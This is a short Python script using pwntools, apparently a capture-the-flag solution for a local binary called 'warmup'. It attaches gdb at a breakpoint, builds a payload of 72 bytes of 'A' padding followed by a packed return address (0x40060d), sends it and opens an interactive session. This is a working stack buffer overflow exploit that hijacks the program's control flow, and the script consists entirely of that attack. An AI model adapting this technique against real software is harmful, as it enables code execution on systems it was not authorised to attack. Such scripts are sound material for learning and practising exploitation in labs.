from pwn import *

p = process('./warmup')
gdb.attach(p, gdbscript='b *0x00000000004006a3')

addr = 0x40060d

payload = b"A" * 9 * 8
payload += p64(addr)

p.sendline(payload)

p.interactive()
